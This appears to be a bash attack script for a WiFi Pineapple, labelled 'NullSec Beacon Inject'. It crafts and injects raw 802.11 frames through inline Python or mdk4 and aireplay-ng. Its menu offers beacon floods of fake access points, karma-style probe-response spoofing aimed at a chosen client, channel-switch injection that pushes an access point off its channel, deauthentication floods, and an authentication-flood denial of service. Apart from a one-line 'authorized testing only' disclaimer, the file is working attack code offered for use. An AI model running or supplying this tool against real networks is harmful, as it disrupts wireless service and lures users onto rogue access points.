#!/bin/bash
#═══════════════════════════════════════════════════════════════════════════════
# NullSec Beacon Inject
# Craft and inject 802.11 beacon/probe/management frames
#
# For authorized security testing only!
# Credits: Built for Hak5 WiFi Pineapple - https://hak5.org
#═══════════════════════════════════════════════════════════════════════════════

VERSION="1.0"
LOOT_DIR="/mmc/nullsec/beacon-inject"
DATE_TAG=$(date +%Y%m%d_%H%M%S)
IFACE="wlan0mon"
LOG_FILE="$LOOT_DIR/inject_${DATE_TAG}.log"

mkdir -p "$LOOT_DIR"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

banner() {
    echo -e "${GREEN}"
    cat << 'EOF'
    ╔═══════════════════════════════════════════════════════════════╗
    ║            NULLSEC BEACON INJECT v1.0                         ║
    ║                                                               ║
    ║         802.11 Management Frame Injection                     ║
    ╚═══════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

log() {
    local level="$1"
    shift
    case "$level" in
        INFO)  echo -e "${GREEN}[INFO]${NC} $*" ;;
        WARN)  echo -e "${YELLOW}[WARN]${NC} $*" ;;
        ALERT) echo -e "${RED}[ALERT]${NC} $*" ;;
        SCAN)  echo -e "${CYAN}[SCAN]${NC} $*" ;;
        INJECT) echo -e "${MAGENTA}[INJECT]${NC} $*" ;;
    esac
    echo "[$(date '+%H:%M:%S')] [$level] $*" >> "$LOG_FILE"
}

# Generate random MAC
rand_mac() {
    printf '%02x:%02x:%02x:%02x:%02x:%02x' \
        $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) \
        $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256))
}

# Generate vendor-specific MAC
vendor_mac() {
    local vendor="$1"
    case "$vendor" in
        apple)    echo "00:1f:f3:$(printf '%02x:%02x:%02x' $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))" ;;
        samsung)  echo "a8:9f:ba:$(printf '%02x:%02x:%02x' $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))" ;;
        google)   echo "f4:f5:d8:$(printf '%02x:%02x:%02x' $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))" ;;
        cisco)    echo "00:1a:2b:$(printf '%02x:%02x:%02x' $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))" ;;
        netgear)  echo "c0:3f:0e:$(printf '%02x:%02x:%02x' $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))" ;;
        linksys)  echo "20:aa:4b:$(printf '%02x:%02x:%02x' $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))" ;;
        *)        rand_mac ;;
    esac
}

# Mass beacon flood - create hundreds of fake APs
beacon_flood() {
    local count="${1:-100}"
    local channel="${2:-6}"
    local wordlist="${3:-}"
    
    log INJECT "Beacon flood: $count fake APs on channel $channel"
    
    # Default SSID list
    SSID_LIST=(
        "Free WiFi" "Airport WiFi" "Starbucks WiFi" "Hotel Guest"
        "ATT WiFi" "xfinity" "NETGEAR" "linksys" "FBI Surveillance Van"
        "Pretty Fly for a WiFi" "Bill Wi the Science Fi" "Wu-Tang LAN"
        "The Promised LAN" "LAN Solo" "Drop It Like Its Hotspot"
        "Loading..." "Virus Distribution Center" "NSA Listening Post"
        "Tell My WiFi Love Her" "Get Off My LAN" "Router I Hardly Know Her"
    )
    
    # Use custom wordlist if provided
    if [ -n "$wordlist" ] && [ -f "$wordlist" ]; then
        mapfile -t SSID_LIST < "$wordlist"
        log INFO "Loaded ${#SSID_LIST[@]} SSIDs from $wordlist"
    fi
    
    # Set channel
    iwconfig "$IFACE" channel "$channel" 2>/dev/null
    
    # Inject beacons
    local injected=0
    while [ "$injected" -lt "$count" ]; do
        for ssid in "${SSID_LIST[@]}"; do
            [ "$injected" -ge "$count" ] && break
            
            local bssid=$(rand_mac)
            local ssid_hex=$(echo -n "$ssid" | xxd -p)
            local ssid_len=${#ssid}
            
            # Craft beacon frame using mdk3/mdk4 or scapy
            if command -v mdk4 &>/dev/null; then
                echo "$ssid" >> /tmp/beacon_ssids.txt
            else
                # Raw injection via python
                python3 -c "
import socket, struct, time
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
s.bind(('$IFACE', 0))

# Radiotap header
radiotap = bytes.fromhex('0000120000022c0000a00200004000')

# Beacon frame
frame_ctrl = struct.pack('<H', 0x0080)  # Beacon
duration = struct.pack('<H', 0)
da = bytes.fromhex('ffffffffffff')
sa = bytes.fromhex('$(echo $bssid | tr -d ':')')
bssid_b = sa
seq = struct.pack('<H', 0)
timestamp = struct.pack('<Q', int(time.time() * 1000000))
beacon_int = struct.pack('<H', 100)
cap = struct.pack('<H', 0x0411)

# SSID IE
ssid_ie = struct.pack('BB', 0, $ssid_len) + b'$ssid'
# Rates IE
rates = bytes.fromhex('010882848b960c121824')
# Channel IE
channel = struct.pack('BBB', 3, 1, $channel)

frame = radiotap + frame_ctrl + duration + da + sa + bssid_b + seq + timestamp + beacon_int + cap + ssid_ie + rates + channel
s.send(frame)
s.close()
" 2>/dev/null
            fi
            
            injected=$((injected + 1))
            printf "\r${MAGENTA}[INJECT]${NC} Beacons: %d/%d" "$injected" "$count"
        done
    done
    
    # Use mdk4 if available for sustained flood
    if command -v mdk4 &>/dev/null && [ -f /tmp/beacon_ssids.txt ]; then
        log INJECT "Sustained flood via mdk4..."
        mdk4 "$IFACE" b -f /tmp/beacon_ssids.txt -c "$channel" &
        FLOOD_PID=$!
        log INFO "Flood PID: $FLOOD_PID (kill to stop)"
    fi
    
    echo ""
    log INJECT "Beacon flood: $injected frames sent"
}

# Targeted probe response attack
probe_response_attack() {
    local target_mac="$1"
    
    log INJECT "Probe response attack targeting $target_mac..."
    
    # First capture probe requests from target
    PROBE_CAP="/tmp/probe_cap.pcap"
    log SCAN "Capturing probe requests from target..."
    
    timeout 30 tcpdump -i "$IFACE" -w "$PROBE_CAP" \
        "ether src $target_mac and type mgt subtype probe-req" 2>/dev/null
    
    # Extract SSIDs the target is looking for
    PROBED_SSIDS=$(tshark -r "$PROBE_CAP" -T fields -e wlan.ssid 2>/dev/null | \
        sort -u | grep -v '^$')
    
    if [ -z "$PROBED_SSIDS" ]; then
        log WARN "No probe requests captured from target"
        rm -f "$PROBE_CAP"
        return 1
    fi
    
    log INFO "Target probing for:"
    echo "$PROBED_SSIDS" | while read -r ssid; do
        log INFO "  → $ssid"
    done
    
    # Respond to each probed SSID
    echo "$PROBED_SSIDS" | while read -r ssid; do
        local fake_bssid=$(vendor_mac "linksys")
        log INJECT "Responding as '$ssid' ($fake_bssid)"
        
        # Create hostapd config for this SSID
        cat > "/tmp/hostapd_probe_${RANDOM}.conf" << HAPD
interface=wlan1
driver=nl80211
ssid=$ssid
hw_mode=g
channel=6
auth_algs=1
HAPD
    done
    
    rm -f "$PROBE_CAP"
}

# CSA (Channel Switch Announcement) injection
csa_inject() {
    local target_bssid="$1"
    local target_channel="$2"
    local new_channel="${3:-13}"
    
    log INJECT "CSA injection: Moving $target_bssid from ch$target_channel to ch$new_channel"
    
    # Craft CSA beacon
    python3 << PYEOF
import socket, struct, time

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
s.bind(('$IFACE', 0))

# Radiotap
radiotap = bytes.fromhex('0000120000022c0000a00200004000')

bssid = bytes.fromhex('$(echo "$target_bssid" | tr -d ':')')
broadcast = bytes.fromhex('ffffffffffff')

for i in range(100):
    # Beacon with CSA IE
    frame_ctrl = struct.pack('<H', 0x0080)
    duration = struct.pack('<H', 0)
    seq = struct.pack('<H', i << 4)
    timestamp = struct.pack('<Q', int(time.time() * 1000000))
    beacon_int = struct.pack('<H', 100)
    cap = struct.pack('<H', 0x0411)
    
    # CSA IE (Element ID 37)
    csa_ie = struct.pack('BBBB', 37, 3, 1, $new_channel) + struct.pack('B', 3 - (i % 4))
    
    frame = radiotap + frame_ctrl + duration + broadcast + bssid + bssid + seq
    frame += timestamp + beacon_int + cap + csa_ie
    
    s.send(frame)
    time.sleep(0.01)

s.close()
print(f"Sent 100 CSA frames: ch$target_channel -> ch$new_channel")
PYEOF
    
    log INJECT "CSA injection complete"
}

# Deauth with reason code manipulation
smart_deauth() {
    local target_bssid="$1"
    local client_mac="${2:-ff:ff:ff:ff:ff:ff}"
    local reason="${3:-7}"
    local count="${4:-50}"
    
    # Reason codes:
    # 1 = Unspecified, 2 = Auth no longer valid, 3 = Deauth leaving
    # 4 = Inactivity, 5 = AP overloaded, 6 = Class 2 from unauth
    # 7 = Class 3 from unassoc, 8 = Dissoc leaving
    
    local reasons=("Unspecified" "Auth_Invalid" "Deauth_Leaving" 
                    "Inactivity" "AP_Overloaded" "Class2_Unauth" 
                    "Class3_Unassoc" "Dissoc_Leaving")
    
    log INJECT "Smart deauth: $target_bssid -> $client_mac"
    log INJECT "  Reason: $reason (${reasons[$reason]})"
    log INJECT "  Count: $count frames"
    
    if command -v aireplay-ng &>/dev/null; then
        aireplay-ng --deauth "$count" -a "$target_bssid" -c "$client_mac" "$IFACE" 2>/dev/null &
        wait $!
    else
        python3 << PYEOF
import socket, struct

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
s.bind(('$IFACE', 0))

radiotap = bytes.fromhex('0000120000022c0000a00200004000')
ap = bytes.fromhex('$(echo "$target_bssid" | tr -d ':')')
client = bytes.fromhex('$(echo "$client_mac" | tr -d ':')')

for i in range($count):
    # AP -> Client deauth
    frame = radiotap
    frame += struct.pack('<H', 0x00C0)  # Deauth
    frame += struct.pack('<H', 0)       # Duration
    frame += client + ap + ap           # DA, SA, BSSID
    frame += struct.pack('<H', i << 4)  # Sequence
    frame += struct.pack('<H', $reason) # Reason code
    s.send(frame)
    
    # Client -> AP deauth  
    frame2 = radiotap
    frame2 += struct.pack('<H', 0x00C0)
    frame2 += struct.pack('<H', 0)
    frame2 += ap + client + ap
    frame2 += struct.pack('<H', (i + $count) << 4)
    frame2 += struct.pack('<H', $reason)
    s.send(frame2)

s.close()
print(f"Sent {$count * 2} deauth frames (reason=$reason)")
PYEOF
    fi
    
    log INJECT "Deauth complete: $((count * 2)) frames"
}

# Auth flood (DoS)
auth_flood() {
    local target_bssid="$1"
    local rate="${2:-100}"
    
    log INJECT "Auth flood: $target_bssid at $rate frames/s"
    
    if command -v mdk4 &>/dev/null; then
        mdk4 "$IFACE" a -a "$target_bssid" -m &
        FLOOD_PID=$!
        log INFO "Auth flood PID: $FLOOD_PID"
    else
        python3 << PYEOF
import socket, struct, random, time

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
s.bind(('$IFACE', 0))

radiotap = bytes.fromhex('0000120000022c0000a00200004000')
ap = bytes.fromhex('$(echo "$target_bssid" | tr -d ':')')

count = 0
while True:
    fake_client = bytes([random.randint(0,255) for _ in range(6)])
    
    # Auth request frame
    frame = radiotap
    frame += struct.pack('<H', 0x00B0)  # Auth
    frame += struct.pack('<H', 0)       # Duration
    frame += ap + fake_client + ap      # DA, SA, BSSID
    frame += struct.pack('<H', count << 4)
    frame += struct.pack('<HHH', 0, 1, 0)  # Open, seq=1, status=0
    
    s.send(frame)
    count += 1
    
    if count % $rate == 0:
        print(f"\rAuth frames sent: {count}", end='', flush=True)
        time.sleep(1)
    
    if count > 10000:
        break

s.close()
PYEOF
    fi
}

# Menu
menu() {
    echo -e "\n${CYAN}Beacon Inject Modes:${NC}"
    echo -e "  ${GREEN}1)${NC} Beacon Flood (mass fake APs)"
    echo -e "  ${GREEN}2)${NC} Probe Response Attack (karma-style)"
    echo -e "  ${GREEN}3)${NC} CSA Channel Switch Injection"
    echo -e "  ${GREEN}4)${NC} Smart Deauth (custom reason codes)"
    echo -e "  ${GREEN}5)${NC} Auth Flood DoS"
    echo -e "  ${GREEN}0)${NC} Exit"
    echo -ne "\n${YELLOW}Select mode: ${NC}"
    read -r mode
    
    case $mode in
        1)
            echo -ne "${YELLOW}Count [100]: ${NC}"; read -r c
            echo -ne "${YELLOW}Channel [6]: ${NC}"; read -r ch
            beacon_flood "${c:-100}" "${ch:-6}"
            ;;
        2)
            echo -ne "${YELLOW}Target MAC: ${NC}"; read -r mac
            probe_response_attack "$mac"
            ;;
        3)
            echo -ne "${YELLOW}Target BSSID: ${NC}"; read -r bssid
            echo -ne "${YELLOW}Current channel: ${NC}"; read -r ch
            echo -ne "${YELLOW}Force to channel [13]: ${NC}"; read -r nch
            csa_inject "$bssid" "$ch" "${nch:-13}"
            ;;
        4)
            echo -ne "${YELLOW}Target BSSID: ${NC}"; read -r bssid
            echo -ne "${YELLOW}Client MAC [broadcast]: ${NC}"; read -r cmac
            echo -ne "${YELLOW}Reason code [7]: ${NC}"; read -r reason
            echo -ne "${YELLOW}Count [50]: ${NC}"; read -r cnt
            smart_deauth "$bssid" "${cmac:-ff:ff:ff:ff:ff:ff}" "${reason:-7}" "${cnt:-50}"
            ;;
        5)
            echo -ne "${YELLOW}Target BSSID: ${NC}"; read -r bssid
            auth_flood "$bssid"
            ;;
        0) exit 0 ;;
    esac
}

main() {
    banner
    
    while true; do
        menu
    done
}

main "$@"
